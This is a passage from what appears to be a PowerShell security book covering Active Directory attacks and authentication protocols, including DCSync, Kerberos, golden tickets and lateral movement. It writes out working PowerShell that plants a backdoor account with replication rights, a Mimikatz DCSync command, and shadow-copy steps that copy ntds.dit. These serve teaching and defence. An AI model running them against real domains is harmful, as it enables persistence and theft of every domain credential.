			<p>To execute this <a id="_idIndexMarker1078"/>attack, the attacker must have high-level privileges within the domain. One way to obtain these privileges is by creating backdoor accounts, which can be used to bypass security controls and grant the attacker <span class="No-Break">elevated permissions.</span></p>
			<p>As a first step, we create a new user account, <strong class="source-inline">"backdoor"</strong>, that should act as the attacker <span class="No-Break"><strong class="source-inline">backdoor</strong></span><span class="No-Break"> account:</span></p>
			<pre class="source-code">
$AttackerName = "backdoor"
$AttackerPassword = Read-Host -AsSecureString
$AttackerDescription = "Backdoor account for DCSync attack"
$AttackerPath = "OU=Service Accounts,OU=Tier 0,DC=PSSec,DC=local"
New-ADUser -Name $AttackerName -AccountPassword $AttackerPassword -Description $AttackerDescription -Path $AttackerPath -Enabled $true</pre>
			<p>Next, we create the variables that we will use in the DCSync attack. First, we retrieve the name of the backdoor user created earlier and save it in the <strong class="source-inline">$AttackerIdentity</strong> variable for later use, using the <span class="No-Break"><strong class="source-inline">NTAccount</strong></span><span class="No-Break"> class.</span></p>
			<p>Now, we<a id="_idIndexMarker1079"/> connect to the root of the domain and retrieve the domain’s distinguished name. We create a <strong class="source-inline">$ReplAddGUID</strong> variable to hold the GUID for the “Replicating Directory Changes All” extended right (<strong class="source-inline">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</strong>). We also create variables to specify the type of access control needed for the <span class="No-Break">DCSync attack:</span></p>
			<pre class="source-code">
$AttackerIdentity = [System.Security.Principal.NTAccount]("PSSec\" + (Get-ADUser $AttackerName).Name).ToString()
$Dsa = [ADSI]"LDAP://rootDSE"
$domainDN = $Dsa.defaultNamingContext
$ReplAllGUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
$ObjRights = "ExtendedRight"
$ObjControlType  = [System.Security.AccessControl.AccessControlType]::Allow
$ObjInherit = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"</pre>
			<p>Finally, we create an AD access rule using the attacker’s identity, access rights, control type, inheritance, and a predefined GUID value. Then, we obtain the security descriptor of the domain directory object using the domain name, add the access rule to the security descriptor’s DACL, and save the changes to the <span class="No-Break">directory object:</span></p>
			<pre class="source-code">
$Ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($AttackerIdentity, $ObjRights, $ObjControlType , $ObjInherit, $ReplAllGUID)
$Dacl = [ADSI]"LDAP://$domainDN"
$Dacl.psbase.ObjectSecurity.AddAccessRule($Ace)
$Dacl.psbase.CommitChanges()</pre>
			<p>Now that the access rights are configured accordingly, an attacker could extract password hashes, for example, by using a tool such <span class="No-Break">as Mimikatz.</span></p>
			<p>Mimikatz<a id="_idIndexMarker1080"/> is an<a id="_idIndexMarker1081"/> infamous tool that was originally written by Benjamin Delpy, and the DCSync function was written by Vincent le Toux. You can download the <a id="_idIndexMarker1082"/>source code as well as the binary files from <span class="No-Break">GitHub: </span><a href="https://github.com/gentilkiwi/mimikatz/wiki"><span class="No-Break">https://github.com/gentilkiwi/mimikatz/wiki</span></a><span class="No-Break">.</span></p>
			<p>Once the binary files are downloaded or built using the source code, navigate to the folder where the <strong class="source-inline">mimikatz.exe</strong> file is located and <span class="No-Break">execute it:</span></p>
			<pre class="source-code">
&gt; .\mimikatz.exe</pre>
			<p>Mimikatz loads, and you can now type your <strong class="source-inline">mimikatz</strong> commands. The following allows you to perform the <span class="No-Break">DCSync attack:</span></p>
			<pre class="source-code">
&gt; lsadump::dcsync /all /csv</pre>
			<p>Understanding, monitoring, and securing domain ACLs is crucial for preventing unauthorized access and exfiltration in an AD environment. However, it’s also important to consider domain trusts, which can pose additional security risks if not properly configured <span class="No-Break">and monitored.</span></p>
			<h2 id="_idParaDest-162"><a id="_idTextAnchor170"/>Domain trusts</h2>
			<p>Trusts <a id="_idIndexMarker1083"/>are a great way to connect forests and domains with <a id="_idIndexMarker1084"/>each other. A trust allows you to access the resources of another forest without having an account in that forest. More information about trusts can be found <span class="No-Break">here: </span><a href="https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust"><span class="No-Break">https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust</span></a><span class="No-Break">.</span></p>
			<p>But trusts also open a risk of more people accessing your resources and possibly your identities. Therefore, you should regularly audit which trusts are available and remove trusts that are no <span class="No-Break">longer needed.</span></p>
			<p>Using the <strong class="source-inline">Get-ADTrust</strong> cmdlet, which is part of the <strong class="source-inline">ActiveDirectory</strong> module, you can see which trusts are established from and to <span class="No-Break">your domain:</span></p>
			<pre class="source-code">
&gt; Get-ADTrust -Filter *</pre>
			<p>In addition to using the <strong class="source-inline">Get-ADTrust</strong> cmdlet, you can also use the <strong class="source-inline">[adsisearcher]</strong> accelerator to view established trusts when the <strong class="source-inline">ActiveDirectory</strong> module is not available. Use the following command to filter for <span class="No-Break">trusted domains:</span></p>
			<pre class="source-code">
&gt; ([adsisearcher]"(objectClass=trusteddomain)").FindAll()</pre>
			<p>A trust <a id="_idIndexMarker1085"/>can <a id="_idIndexMarker1086"/>have <span class="No-Break">multiple directions:</span></p>
			<ul>
				<li><strong class="bold">Bidirectional</strong>: Both<a id="_idIndexMarker1087"/> domains/forests trust each other. Users can access resources within <span class="No-Break">both domains/forests.</span></li>
				<li><strong class="bold">Inbound</strong>: The<a id="_idIndexMarker1088"/> current domain/forest is the trusting domain or forest. That means that users from the trusted domain/forest can access resources in the current domain/forest, but not the other <span class="No-Break">way around.</span></li>
				<li><strong class="bold">Outbound</strong>: The<a id="_idIndexMarker1089"/> current domain/forest is the domain/forest that is trusted; users from this domain/forest can access resources from the other <span class="No-Break">trusted domain/forest.</span></li>
			</ul>
			<p>For unidirectional trusts, if we say that the <strong class="source-inline">Company</strong> domain trusts the <strong class="source-inline">PartnerCompany</strong> domain, that means that defined users from the <strong class="source-inline">PartnerCompany</strong> domain can access resources within the <strong class="source-inline">Company</strong> domain, but not the other <span class="No-Break">way around.</span></p>
			<p>Of course, this is not a complete list of enumeration methods for AD, but it should help to get started. If you are interested in what other enumeration options exist, the following blog article is a great <span class="No-Break">resource: </span><a href="https://adsecurity.org/?p=3719"><span class="No-Break">https://adsecurity.org/?p=3719</span></a><span class="No-Break">.</span></p>
			<h1 id="_idParaDest-163"><a id="_idTextAnchor171"/>Credential theft</h1>
			<p>One of the first <a id="_idIndexMarker1090"/>goals attackers are usually after is to extract identities and use them for lateral movement to get hold of even more identities and repeat this procedure until they find highly privileged credentials (such as those of a domain administrator) to <a id="_idIndexMarker1091"/>then gain control over AD and quickly, over the <span class="No-Break">entire environment.</span></p>
			<p>In this section, we will investigate the basics of authentication within an on-premises AD environment and how credential-related <span class="No-Break">attacks work.</span></p>
			<h2 id="_idParaDest-164"><a id="_idTextAnchor172"/>Authentication protocols</h2>
			<p><strong class="bold">Lateral movement</strong>, <strong class="bold">pass the hash</strong>, <strong class="bold">pass the ticket</strong> – these <a id="_idIndexMarker1092"/>attacks <a id="_idIndexMarker1093"/>are not limited to PowerShell, so <a id="_idIndexMarker1094"/>they are<a id="_idIndexMarker1095"/> not a PowerShell-specific problem. But since PowerShell relies on the same authentication mechanisms<a id="_idIndexMarker1096"/> as normal authentication, it is important to look a little bit behind <span class="No-Break">the scenes.</span></p>
			<p>When we are talking about authentication, we are jumping into very cold water, diving deep into protocols. After reading these sections, you will not be an expert on authentication protocols, but you will get an understanding of how <strong class="bold">credential theft</strong> attacks <span class="No-Break">are possible.</span></p>
			<p>To get started, it is important to understand which authentication protocols exist in general. The most used protocols<a id="_idIndexMarker1097"/> are <strong class="bold">NT LAN Manager</strong> (<strong class="bold">NTLM</strong>) and <strong class="bold">Kerberos</strong>, but<a id="_idIndexMarker1098"/> in some environments, legacy <strong class="bold">LAN Manager</strong> authentication is <span class="No-Break">still allowed.</span></p>
			<p>Protocol-wise, I recommend using Kerberos and falling back<a id="_idIndexMarker1099"/> to <strong class="bold">NTLMv2</strong> where it’s not possible. Disable the usage of LAN Manager<a id="_idIndexMarker1100"/> and <strong class="bold">NTLMv1</strong> after you have verified that those protocols are not used anymore in your environment (and yes, I know – this can be a <span class="No-Break">long process).</span></p>
			<h3>LAN Manager</h3>
			<p>LAN Manager <a id="_idIndexMarker1101"/>is a very old <a id="_idIndexMarker1102"/>protocol; it was implemented in 1987 and is nowadays old and deprecated. If LAN Manager is used for authentication, it is very easy for attackers to guess the original passwords: LAN Manager passwords can easily be brute-forced <span class="No-Break">within minutes.</span></p>
			<p>Thankfully, the old and vulnerable LAN Manager authentication is barely used nowadays. When I assessed customer environments for security risks, I was glad to only find this legacy<a id="_idIndexMarker1103"/> protocol in a few environments – for example, due to outdated software or old machinery that is still in use and cannot <span class="No-Break">be replaced.</span></p>
			<p class="callout-heading">Be Careful When Migrating from LAN Manager or NTLMv1 to NTLMv2 Only!</p>
			<p class="callout">Do not just forbid LAN Manager or NTLMv1 in your environment without a proper migration plan. Audit what systems still use LAN Manager or NTLMv1 and then first migrate those systems to newer protocols before you enforce the usage <span class="No-Break">of NTLMv2.</span></p>
			<p>I won’t <a id="_idIndexMarker1104"/>describe LAN Manager in detail; it is so outdated, it really should not be used anymore. If you happen to find LAN Manager in your environment, make sure to work on a plan to mitigate this risk and start migrating <span class="No-Break">to NTLMv2.</span></p>
			<h3>NTLM</h3>
			<p>NTLM<a id="_idIndexMarker1105"/> is a challenge/response-based authentication protocol. It is the default authentication<a id="_idIndexMarker1106"/> protocol of <strong class="bold">Windows NT 4.0</strong> and earlier <a id="_idIndexMarker1107"/><span class="No-Break">Windows versions.</span></p>
			<p>There are two versions of NTLM that can be used: NTLMv1 and NTLMv2. NTLMv1 is nowadays considered insecure and NTLMv2 should be used, and it is recommended to disable NTLMv1, as well as LAN Manager, in <span class="No-Break">Enterprise environments.</span></p>
			<p>If we look at the basic functionality, NTLM versions 1 and 2 work <span class="No-Break">quite similarly:</span></p>
			<ol>
				<li>When logging on, the client sends the plaintext username to <span class="No-Break">the server.</span></li>
				<li>The server generates a random number (<em class="italic">challenge</em> or <em class="italic">nonce</em>) and sends it back to <span class="No-Break">the client.</span></li>
				<li>The hash of the user’s password is used to encrypt the challenge received from the server and returns the result back to the <span class="No-Break">server (</span><span class="No-Break"><em class="italic">response</em></span><span class="No-Break">).</span></li>
			</ol>
			<p>Using NTLMv1, the client takes the challenge <em class="italic">as it is</em>, adds the client nonce (<em class="italic">client nonce + server nonce</em>), encrypts<a id="_idIndexMarker1108"/> it using <strong class="bold">Data Encryption Standard </strong>(<strong class="bold">DES</strong>), and sends <span class="No-Break">it back.</span></p>
			<p>Using NTLMv2, the client adds other parameters to the challenge: (<em class="italic">client nonce + server nonce + timestamp + username + target</em>) before hashing it with HMAC-MD5 <a id="_idIndexMarker1109"/>and sending it back. These additional parameters protect the conversation against a replay attack (an attack where data is repeated <span class="No-Break">or delayed).</span></p>
			<ol>
				<li value="4">The <a id="_idIndexMarker1110"/>server (on which the user tries to log on) sends the following three items to the authenticating server (if it’s a domain account, the server is a domain controller) to verify that the requesting user is allowed to <span class="No-Break">log on:</span><ul><li><span class="No-Break"><strong class="bold">Username</strong></span></li><li><strong class="bold">Challenge</strong> (which was sent to <span class="No-Break">the client)</span></li><li><strong class="bold">Response</strong> (which was received from <span class="No-Break">the client)</span></li></ul></li>
			</ol>
			<p>If the account is local to the server, the server will authenticate the user itself. If the account is a domain account, the server forwards the challenge and the authentication response to the domain controller for authentication. Please note that local accounts can also use NTLM; in this case, the client machine itself can also be the server to which the <span class="No-Break">client authenticates.</span></p>
			<ol>
				<li value="5">The server or domain controller looks up the username and gets the corresponding <a id="_idIndexMarker1111"/>password hash out of the <strong class="bold">Security Account Manager</strong> (<strong class="bold">SAM</strong>) database and uses it to encrypt/hash <span class="No-Break">the challenge.</span></li>
				<li>The server or domain controller compares the encrypted/hashed challenge it computed earlier with the response computed by the client. If both are identical, the authentication <span class="No-Break">is successful.</span></li>
			</ol>
			<p>If you want to learn more about why LAN Manager is so vulnerable, what the differences between NTLMv1 and NTLMv2 are, and why neither LAN Manager nor NTLMv1 should be used anymore, you can learn more about these topics in a blog article that I <span class="No-Break">wrote: </span><a href="https://miriamxyra.com/2017/11/08/stop-using-lan-manager-and-ntlmv1/"><span class="No-Break">https://miriamxyra.com/2017/11/08/stop-using-lan-manager-and-ntlmv1/</span></a><span class="No-Break">.</span></p>
			<p class="callout-heading">Be Careful When Configuring Authentication Protocols</p>
			<p class="callout">Of course, you should not just disable LAN Manager and NTLMv1 without analyzing whether those protocols are still used. In the mentioned blog article, you will also find best practices on how to audit which protocols are still <span class="No-Break">in use.</span></p>
			<p>If <a id="_idIndexMarker1112"/>possible, only use Kerberos for domain authentication. If this is not possible (because a target is not a domain member or has no DNS name), configure the fallback to NTLMv2 and prohibit the usage of LAN Manager <span class="No-Break">and NTLMv1.</span></p>
			<h3>Kerberos</h3>
			<p>In Greek <a id="_idIndexMarker1113"/>mythology, Kerberos <a id="_idIndexMarker1114"/>is a three-headed hellhound who guards the entrance to Hades, the underworld, so that no living can enter, but also no dead <span class="No-Break">can leave.</span></p>
			<p>So, this name of the famous hellhound is pretty fitting when it comes to authentication because the authentication protocol Kerberos also consists of three heads: three phases are needed to authenticate <span class="No-Break">using Kerberos.</span></p>
			<p>While NTLM is a challenge-response authentication mechanism, Kerberos authentication is <strong class="bold">ticket</strong> based and relies on<a id="_idIndexMarker1115"/> verification by a third entity, the <strong class="bold">Key Distribution </strong><span class="No-Break"><strong class="bold">Center</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">KDC</strong></span><span class="No-Break">).</span></p>
			<p>Tickets are <a id="_idIndexMarker1116"/>encrypted <strong class="bold">binary large objects</strong> (<strong class="bold">blobs</strong>). They cannot be decrypted by the ticket holder and are used as proof of identity by the Kerberos protocol. Only the ticket receiver (for example, the domain controller) can decrypt the ticket using <span class="No-Break">symmetric keys.</span></p>
			<p>The KDC is the Kerberos service responsible for implementing the authentication and ticket-granting services as defined in the Kerberos protocol. In Windows environments, the KDC is already integrated within the domain <span class="No-Break">controller role.</span></p>
			<p>Before we dive deeper into how Kerberos authentication works, we need to clarify <span class="No-Break">some vocabulary.</span></p>
			<h4>Kerberos vocabulary</h4>
			<p>The following<a id="_idIndexMarker1117"/> are some important <span class="No-Break">Kerberos vocabulary:</span></p>
			<ul>
				<li><strong class="bold">Ticket-Granting Ticket</strong> (<strong class="bold">TGT</strong>): A<a id="_idIndexMarker1118"/> TGT can be used to obtain service tickets from a TGS. After <a id="_idIndexMarker1119"/>the initial authentication in<a id="_idIndexMarker1120"/> the <strong class="bold">Authentication Service</strong> (<strong class="bold">AS</strong>) exchange, a TGT is created. Once a TGT is present on the system, users do not need to enter their credentials again and can use the TGT instead to obtain future <span class="No-Break">service tickets.</span></li>
				<li><strong class="bold">Ticket-Granting Service</strong> (<strong class="bold">TGS</strong>): The<a id="_idIndexMarker1121"/> TGS<a id="_idIndexMarker1122"/> can issue service tickets to access other services either in the domain where the TGS itself resides, or to access the TGS in <span class="No-Break">another domain.</span></li>
				<li><strong class="bold">Service ticket</strong>: A <a id="_idIndexMarker1123"/>service ticket allows access <a id="_idIndexMarker1124"/>to any service other than <span class="No-Break">the TGS.</span></li>
				<li><strong class="bold">Privilege Attribute Certificate</strong> (<strong class="bold">PAC</strong>): The <a id="_idIndexMarker1125"/>PAC provides a description of particular authorization <a id="_idIndexMarker1126"/>data within a ticket’s authorization data field. PAC is only specific to Kerberos authentication in Microsoft environments. The PAC contains several data components, such as including group membership data for authorization or alternate credentials for non-Kerberos <span class="No-Break">authentication protocols.</span></li>
				<li><strong class="bold">Secret key</strong>: A <a id="_idIndexMarker1127"/>password is a typical example of a secret key: it’s<a id="_idIndexMarker1128"/> a long-lasting symmetric encryption key, shared between two entities (such as between a user and a <span class="No-Break">domain controller).</span></li>
			</ul>
			<h4>The three phases of Kerberos authentication</h4>
			<p>Kerberos <a id="_idIndexMarker1129"/>authentication<a id="_idIndexMarker1130"/> consists of three phases: AS exchange, TGS exchange, and client <span class="No-Break">server authentication.</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer160">
					<img alt="Figure 6.8 – The three phases of Kerberos authentication" src="image/B16679_06_008.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.8 – The three phases of Kerberos authentication</p>
			<p><strong class="bold">Phase 1: </strong><span class="No-Break"><strong class="bold">AS Exchange</strong></span></p>
			<p>This phase is <a id="_idIndexMarker1131"/>only executed once per login session<a id="_idIndexMarker1132"/> and consists of <span class="No-Break">two steps:</span></p>
			<ol>
				<li><strong class="source-inline">KRB_AS_REQ</strong> (Kerberos Authentication Service Request): The<a id="_idIndexMarker1133"/> client initiates a request to the authentication server (KDC) to obtain a TGT. A TGT is a time-limited ticket that includes the client’s identity information and SIDs. By default, TGTs can be renewed for up to 7 days and each TGT remains valid for <span class="No-Break">10 hours.</span></li>
				<li><strong class="source-inline">KRB_AS_REP</strong> (Kerberos Authentication Service Reply): The<a id="_idIndexMarker1134"/> KDC then creates and returns a TGT, as well as a session key for communicating with KDC. The TGT is limited to a<a id="_idIndexMarker1135"/> lifetime of 10 hours <span class="No-Break">by default.</span></li>
			</ol>
			<p><strong class="bold">Phase 2: </strong><span class="No-Break"><strong class="bold">TGS Exchange</strong></span></p>
			<p>Phase 2 is only executed<a id="_idIndexMarker1136"/> once per server session. That means it does not need to be repeated, as long as resources on the same server are requested. The two steps for this phase are <span class="No-Break">as follows:</span></p>
			<ol>
				<li><strong class="source-inline">KRB_TGS_REQ</strong> (Kerberos Ticket-Granting Service Request): The client requests a Kerberos TGS<a id="_idIndexMarker1137"/> from the KDC. The request includes a TGT, an authenticator, and the name of the target server, the <strong class="bold">Service Principal Name</strong> (<strong class="bold">SPN</strong>). The <a id="_idIndexMarker1138"/>authenticator includes the user’s ID and a timestamp, both encrypted with the previously shared <span class="No-Break">session key.</span></li>
				<li><strong class="source-inline">KRB_TGS_REP</strong> (Kerberos Ticket-Granting Service Reply): After receiving the TGT and the<a id="_idIndexMarker1139"/> authenticator, the KDC verifies the validity of both and proceeds to issue a ticket and a session key back to <span class="No-Break">the client.</span></li>
			</ol>
			<p class="callout-heading">Authentication = Authorization</p>
			<p class="callout">It is important to keep in mind that authentication and authorization are completely different processes. While authentication confirms a user’s identity, authorization grants a user access <span class="No-Break">to resources.</span></p>
			<p><strong class="bold">Phase 3: </strong><span class="No-Break"><strong class="bold">Client-Server Authentication</strong></span></p>
			<p>In the <a id="_idIndexMarker1140"/>third phase of Kerberos <a id="_idIndexMarker1141"/>authentication, access to a resource is requested. This step is performed once per server connection. That means if you disconnect from a server and connect again, this step needs to <span class="No-Break">be repeated:</span></p>
			<ol>
				<li><strong class="source-inline">KRB_AP_REQ</strong> (Kerberos Application Request): The client sends the ticket to the target server <a id="_idIndexMarker1142"/>to initiate an access request. Subsequently, the server decrypts the ticket, verifies the authenticator, and generates an access token for the user, using the SIDs present in <span class="No-Break">the ticket.</span></li>
				<li><strong class="source-inline">KRB_AP_REP</strong> (Kerberos Application Reply, <em class="italic">optional</em>): Optionally, the client can request mutual <a id="_idIndexMarker1143"/>authentication, prompting the target server to verify its own identity. In this case, the target server encrypts the client’s computer timestamp from the<a id="_idIndexMarker1144"/> authenticator using the session key provided by the TGS for client-target server communication. The encrypted timestamp is then sent back to the client for <span class="No-Break">identity verification.</span></li>
			</ol>
			<h4>User authentication versus service authentication</h4>
			<p>There <a id="_idIndexMarker1145"/>are two different ticket types that can be used for authentication: user authentication and service authentication. If a user wants to authenticate, a TGT  is issued. When a service needs to authenticate, it is issued a service ticket, which is a specific type of ticket designed for service <span class="No-Break">authentication purposes.</span></p>
			<h2 id="_idParaDest-165"><a id="_idTextAnchor173"/>Attacking AD authentication – credential theft and lateral movement</h2>
			<p>As systems<a id="_idIndexMarker1146"/> got more secure over time and just finding enough zero-day exploits to access a company from the internet is nearly impossible<a id="_idIndexMarker1147"/> nowadays, identities became more and <a id="_idIndexMarker1148"/>more important. Environments became more and more secure, so attackers look for the weakest link – which is the <span class="No-Break">human being.</span></p>
			<p>Within <strong class="bold">phishing</strong> attacks, users<a id="_idIndexMarker1149"/> are tricked into opening a link and installing software by, for example, enabling macros, so that the adversaries’ code will be executed on the infected system. In most cases, the user that is framed is a normal user account, which is not very valuable for <span class="No-Break">the attacker.</span></p>
			<p>So, adversaries <a id="_idIndexMarker1150"/>want to get more valuable accounts and move laterally to get even more identities until they find a highly privileged identity – in the best case for the attacker, a domain or enterprise <span class="No-Break">administrator account.</span></p>
			<p>Both <a id="_idIndexMarker1151"/>lateral movement, as well as credential theft, rely on how the authentication protocols Kerberos and NTLM function. For an easier <strong class="bold">single sign-on</strong> (<strong class="bold">SSO</strong>), both<a id="_idIndexMarker1152"/> protocols store their token of authentication – either the NTLM hash or the<a id="_idIndexMarker1153"/> Kerberos ticket – in the <strong class="bold">Local Security </strong><span class="No-Break"><strong class="bold">Authority</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">LSA</strong></span><span class="No-Break">).</span></p>
			<p>You can figuratively imagine the hash or the ticket as a key: if the key is copied by someone else, this person now has access to your house and can come and go as they like. Although the LSA is meant to protect the credentials, tickets and hashes can be extracted <span class="No-Break">and reused.</span></p>
			<p>But it is not only kept on the system; depending on the authentication method, the NTLM hash or the Kerberos ticket are being also forwarded to the remote system and stored in the remote system’s LSA as well. This behavior occurs for example, when a <strong class="bold">remote desktop</strong> is used <span class="No-Break">to authenticate.</span></p>
			<p>A big <a id="_idIndexMarker1154"/>advantage of PowerShell is that no hash or ticket is forwarded to the remote system if only plain PowerShell with WinRM authentication is used. But if PowerShell WinRM using CredSSP authentication is used, the hash or the ticket is forwarded to the remote host and stored in its LSA. This allows a potential attacker to extract the credentials also from the <span class="No-Break">remote system.</span></p>
			<p>Often, PowerShell using CredSSP is used to overcome the second hop problem. But choosing this method leaves your credentials exposed, so you should avoid using CredSSP. If you want to learn more about the second hop problem in PowerShell, please refer to this <span class="No-Break">documentation: </span><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop"><span class="No-Break">https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-second-hop</span></a><span class="No-Break">.</span></p>
			<p>Also, be careful when entering credentials on the current system. If you run a process under a different account (<strong class="source-inline">runas</strong>), you will need to enter the credentials that are locally stored in the LSA – similar to creating scheduled tasks or running tools as a service using a <span class="No-Break">particular account.</span></p>
			<p>Now that you are aware of what protocols are used for authentication and how they work, let’s have a look at different attack vectors against <span class="No-Break">AD authentication.</span></p>
			<h3>ntds.dit extraction</h3>
			<p><strong class="source-inline">ntds.dit</strong> is<a id="_idIndexMarker1155"/> the database that holds all identities and hashes within AD. That means if attackers get hold of this<a id="_idIndexMarker1156"/> database, they have control over all identities in the environment – and so also over the <span class="No-Break">environment itself.</span></p>
			<p>But to get <strong class="source-inline">ntds.dit</strong>, adversaries cannot just copy the file because it is constantly used by AD and is <span class="No-Break">therefore locked.</span></p>
			<p>There are many ways to get<a id="_idIndexMarker1157"/> access to <strong class="source-inline">ntds.dit</strong>. One possibility is to extract it from a backup – for example, using <strong class="bold">volume shadow</strong> copies. This is also a reason why it’s critical to also control strictly who is able to back up and restore domain <span class="No-Break">controller data.</span></p>
			<p>If the domain controller hard disk is unencrypted and does not reside in a secured location, everybody who has physical access can extract <span class="No-Break">the database.</span></p>
			<p>If one <strong class="bold">Domain Controller</strong> (<strong class="bold">DC</strong>) is <a id="_idIndexMarker1158"/>hosted as a virtual machine and the hard disk is not encrypted, every hypervisor administrator can extract it – for example, by using a snapshot or copying the machine and restoring it in an <span class="No-Break">offline location.</span></p>
			<p>If red teamers got direct access to a domain controller (such as through credential theft), <strong class="source-inline">ntds.dit</strong> can also be extracted by using various methods. In the following example, we will look at how this can be achieved by <span class="No-Break">using PowerShell.</span></p>
			<p>As we cannot access <strong class="source-inline">ntds.dit</strong> while it is used by the operating system, we first create a shadow copy point for the <strong class="source-inline">C:\</strong> drive by using <strong class="source-inline">Invoke-CimMethod</strong> and calling the <strong class="source-inline">Create</strong> method of the <strong class="source-inline">Win32_ShadowCopy</strong> class. A shadow copy is a copy of the contents of a drive at a specific point <span class="No-Break">in time.</span></p>
			<p>We then get the path where the newly created shadow copy was created and save it to the <strong class="source-inline">$</strong><span class="No-Break"><strong class="source-inline">ShadowCopyPath</strong></span><span class="No-Break"> variable.</span></p>
			<p>Finally, we create a symbolic link named <strong class="source-inline">shadowcopy</strong> in the root directory of the <strong class="source-inline">C:\</strong> drive that points to the path of the shadow <span class="No-Break">copy point:</span></p>
			<pre class="source-code">
$ShadowCopy = Invoke-CimMethod -ClassName "Win32_ShadowCopy" -Namespace "root\cimv2" -MethodName "Create" -Arguments @{Volume="C:\"}
$ShadowCopyPath = (Get-CimInstance -ClassName Win32_ShadowCopy | Where-Object { $_.ID -eq $ShadowCopy.ShadowID }).DeviceObject + "\\"
cmd /c mklink /d C:\shadowcopy "$ShadowCopyPath"</pre>
			<p>Now, a red <a id="_idIndexMarker1159"/>teamer can<a id="_idIndexMarker1160"/> access the <strong class="source-inline">ntds.dit</strong> file without restrictions, exfiltrate it, or extract hashes for a later <em class="italic">pass-the-hash</em> attack. In this example, we copy it into the <span class="No-Break"><strong class="source-inline">C:\tmp</strong></span><span class="No-Break"> folder:</span></p>
			<pre class="source-code">
Copy-Item "C:\shadowcopy\Windows\NTDS\ntds.dit" -Destination "C:\tmp"</pre>
			<p>You can see that the file was extracted successfully, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer161">
					<img alt="Figure 6.9 – Verifying that ntds.dit was extracted successfully" src="image/B16679_06_009.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 6.9 – Verifying that ntds.dit was extracted successfully</p>
			<p>Finally, we delete the <span class="No-Break">symbolic link:</span></p>
			<pre class="source-code">
(Get-Item C:\shadowcopy).Delete()</pre>
			<p>There are also many ways to extract <strong class="source-inline">ntds.dit</strong>, such as <span class="No-Break">the following:</span></p>
			<ul>
				<li>Using the <strong class="source-inline">ntdsutil</strong> diagnostic tool, which is built in <span class="No-Break">by default</span></li>
				<li>Extracting <strong class="source-inline">ntds.dit</strong> from <a id="_idIndexMarker1161"/>the <strong class="bold">volume shadow copy service</strong> (<strong class="bold">VSS</strong>) – as we did in the <span class="No-Break">preceding example</span></li>
				<li>Copying <strong class="source-inline">ntds.dit</strong> from the offline <span class="No-Break">hard disk</span></li>
				<li>Creating and restoring a snapshot and extracting the file <span class="No-Break">from it</span></li>
				<li>Extracting <strong class="source-inline">ntds.dit</strong> from <span class="No-Break">a backup</span></li>
			</ul>
			<p>Those <a id="_idIndexMarker1162"/>are only a few methods of how attackers can extract the <strong class="source-inline">ntds.dit</strong> database. This is also one of the reasons why it’s so important to also control access to your domain controller <a id="_idIndexMarker1163"/>backups and, if they are virtual machines, strictly restrict access to the VMs, storage, <span class="No-Break">and snapshots.</span></p>
			<p>To mitigate these kinds of attacks, the only thing that really helps is to control access and maintain good <span class="No-Break">credential hygiene.</span></p>
			<p>If the <strong class="source-inline">ntds.dit</strong> file was extracted by an attacker, the only thing that helps is a controlled compromise recovery and twice resetting the password of the <span class="No-Break"><strong class="source-inline">krbtgt</strong></span><span class="No-Break"> account.</span></p>
			<h3>krbtgt</h3>
			<p>In the <strong class="source-inline">ntds.dit</strong> database, there <a id="_idIndexMarker1164"/>is <a id="_idIndexMarker1165"/>also another important account: the <strong class="source-inline">krbtgt</strong> account. This account serves as the default service account for the KDC, performing the necessary functions and operations of the KDC. The TGT password of this account is only known <span class="No-Break">by Kerberos.</span></p>
			<p>But if the hash of this account gets extracted, this enables adversaries to sign ticket requests as the KDC and enables <span class="No-Break"><strong class="bold">golden tickets</strong></span><span class="No-Break">.</span></p>
			<h3>Golden tickets</h3>
			<p>In a<a id="_idIndexMarker1166"/> golden ticket attack, malicious<a id="_idIndexMarker1167"/> actors use Kerberos tickets to gain control over the key distribution service of a valid domain. This gives the attacker access to any resource on an AD domain (hence the name <span class="No-Break"><em class="italic">golden ticket</em></span><span class="No-Break">).</span></p>
			<p>If an attacker gains control over the AD database or a backup of it, they could potentially generate Kerberos TGTs and/or <span class="No-Break">service tickets.</span></p>
			<p>It’s worth noting that any account that has permissions to replicate all attributes, including domain admin accounts, can also perform this activity. This permission is typically granted on the <strong class="source-inline">domainDNS</strong> object, which is located at the root of <span class="No-Break">the domain.</span></p>
			<p>Granting permissions at this level can be particularly risky and impactful, as it can potentially give an <a id="_idIndexMarker1168"/>attacker full control over the domain. </p>
			<p>By doing so, the adversary can impersonate any user or machine from the compromised domain and access all resources in this domain or in any <span class="No-Break">trusted domain.</span></p>
			<h3>Silver tickets</h3>
			<p>If <a id="_idIndexMarker1169"/>adversaries <a id="_idIndexMarker1170"/>get administrator privileges on a system or physical control over a system with an unencrypted hard disk, they can use the machine password to forge <span class="No-Break">TGS tickets.</span></p>
			<p>They could also tamper with the details that are included in the PAC of a ticket. This would enable adversaries to arbitrary generate Kerberos TGS tickets or manipulate authorization details that are contained in the PAC – for example, changing the group membership of an account to a highly privileged one (such as <span class="No-Break">domain administrators).</span></p>
			<h3>Lateral movement</h3>
			<p>After a hash <a id="_idIndexMarker1171"/>or a ticket is <a id="_idIndexMarker1172"/>extracted, the attacker tries to use it to gain access and log on to another system. This process is called <span class="No-Break">lateral movement.</span></p>
			<p>Once access to another system is gained, everything begins again; the adversary tries to extract all present credentials from the LSA and use it to authenticate against <span class="No-Break">other systems.</span></p>
			<p>The attacker’s goal is to find a highly privileged identity – in the best case for an attacker, a domain or enterprise <span class="No-Break">administrator’s identity.</span></p>
			<h3>Pass the hash (PtH)</h3>
